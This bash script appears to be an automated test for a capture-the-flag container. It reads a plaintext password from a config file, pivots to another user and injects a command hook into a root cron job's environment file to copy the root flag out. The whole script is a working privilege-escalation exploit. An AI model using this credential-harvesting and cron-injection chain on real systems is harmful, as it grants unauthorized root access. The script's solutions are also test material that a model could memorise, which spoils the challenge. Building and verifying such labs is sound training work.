#!/bin/bash
# Automated CTF Test Script
# This script automatically executes all exploitation steps from the walkthrough
# and prints the KEY and FLAG values at the end.

set -e

CONTAINER_NAME="exp-02-riosradio_rio-relay-hard_1"
TEMP_FILE="/tmp/ctf_test_output"

echo "=========================================="
echo "CTF Automated Test Script"
echo "=========================================="
echo ""

# Check if container is running
echo "[*] Checking if container is running..."
if ! sudo docker ps | grep -q "$CONTAINER_NAME"; then
    echo "[!] ERROR: Container '$CONTAINER_NAME' is not running!"
    echo "[!] Please start it with: sudo docker-compose up -d"
    exit 1
fi
echo "[+] Container is running"
echo ""

# Function to run command as tokyo user
run_as_tokyo() {
    sudo docker exec -u tokyo "$CONTAINER_NAME" bash -c "$1"
}

# Function to run command as rio user
run_as_rio() {
    sudo docker exec -u rio "$CONTAINER_NAME" bash -c "$1"
}

# Step 1: Initial Enumeration
echo "[*] Step 1: Initial Enumeration"
echo "----------------------------------------"
echo "[*] Checking current user..."
run_as_tokyo "whoami"
echo ""

echo "[*] Verifying we cannot read target files (expected)..."
run_as_tokyo "cat /home/rio/mint.key 2>&1 || true" | grep -q "Permission denied" && echo "[+] Confirmed: Cannot read KEY as tokyo"
run_as_tokyo "cat /root/flag.txt 2>&1 || true" | grep -q "Permission denied" && echo "[+] Confirmed: Cannot read FLAG as tokyo"
echo ""

# Step 2: Find vulnerability - read relay.env
echo "[*] Step 2: Finding vulnerability in relay.env"
echo "----------------------------------------"
echo "[*] Reading /opt/relay/relay.env..."
RELAY_ENV=$(run_as_tokyo "cat /opt/relay/relay.env")
echo "$RELAY_ENV"
echo ""

# Extract Rio password
RIO_PASS=$(echo "$RELAY_ENV" | grep "RIO_PASS=" | cut -d'=' -f2)
if [ -z "$RIO_PASS" ]; then
    echo "[!] ERROR: Could not extract RIO_PASS from relay.env"
    exit 1
fi
echo "[+] Found Rio password: $RIO_PASS"
echo ""

# Step 3: Switch to rio and get KEY
echo "[*] Step 3: Pivoting to Rio user"
echo "----------------------------------------"
echo "[*] Switching to rio user..."
echo "[*] Reading KEY as rio user..."
KEY=$(run_as_rio "cat /home/rio/mint.key")
echo "[+] KEY retrieved: $KEY"
echo ""

# Step 4: Exploit cron to get root flag
echo "[*] Step 4: Root Escalation via Cron"
echo "----------------------------------------"
echo "[*] Checking rotation.env permissions..."
run_as_rio "ls -la /opt/rotation/rotation.env"
echo ""

echo "[*] Injecting POST_ROTATE_HOOK into rotation.env..."
# Clean up any previous hooks and append new one
run_as_rio "grep -v '^POST_ROTATE_HOOK=' /opt/rotation/rotation.env > /tmp/rotation_clean.env; cat /tmp/rotation_clean.env > /opt/rotation/rotation.env; rm -f /tmp/rotation_clean.env"
run_as_rio "echo 'POST_ROTATE_HOOK=\"cat /root/flag.txt > /tmp/root_flag && chmod 666 /tmp/root_flag\"' >> /opt/rotation/rotation.env"
echo "[+] Hook injected"
echo ""

echo "[*] Waiting for cron job to execute (up to 70 seconds)..."
echo "[*] This may take up to 60 seconds for the next cron run..."
START_TIME=$(date +%s)
MAX_WAIT=70
CHECK_INTERVAL=5

while [ $(($(date +%s) - START_TIME)) -lt $MAX_WAIT ]; do
    # Check if the flag file was created
    if run_as_rio "test -f /tmp/root_flag" 2>/dev/null; then
        # Check if it has content
        FLAG_CONTENT=$(run_as_rio "cat /tmp/root_flag 2>/dev/null" || echo "")
        if [ -n "$FLAG_CONTENT" ]; then
            echo "[+] Cron job executed! Flag file created."
            break
        fi
    fi
    
    # Check rotation log for hook execution
    if run_as_rio "grep -q 'executing post-rotate hook' /var/log/relay/rotation.log 2>/dev/null"; then
        echo "[+] Cron job executed! Found hook execution in log."
        # Give it a moment to write the file
        sleep 2
        break
    fi
    
    sleep $CHECK_INTERVAL
    ELAPSED=$(($(date +%s) - START_TIME))
    echo "    Waiting... (${ELAPSED}s elapsed)"
done

# Verify flag file exists
if ! run_as_rio "test -f /tmp/root_flag" 2>/dev/null; then
    echo "[!] WARNING: Flag file not created. Checking rotation log..."
    run_as_rio "tail -20 /var/log/relay/rotation.log" || true
    echo "[!] You may need to wait longer or check the cron job manually."
    exit 1
fi

echo "[*] Reading FLAG..."
FLAG=$(run_as_rio "cat /tmp/root_flag")
echo "[+] FLAG retrieved: $FLAG"
echo ""

# Final Results
echo "=========================================="
echo "CTF TEST RESULTS"
echo "=========================================="
echo ""
echo "KEY: $KEY"
echo "FLAG: $FLAG"
echo ""
echo "=========================================="

# Verify both values are present
if [ -z "$KEY" ]; then
    echo "[!] ERROR: KEY is empty!"
    exit 1
fi

if [ -z "$FLAG" ]; then
    echo "[!] ERROR: FLAG is empty!"
    exit 1
fi

echo "[+] SUCCESS: Both KEY and FLAG retrieved successfully!"
echo "[+] CTF is working correctly!"
echo ""

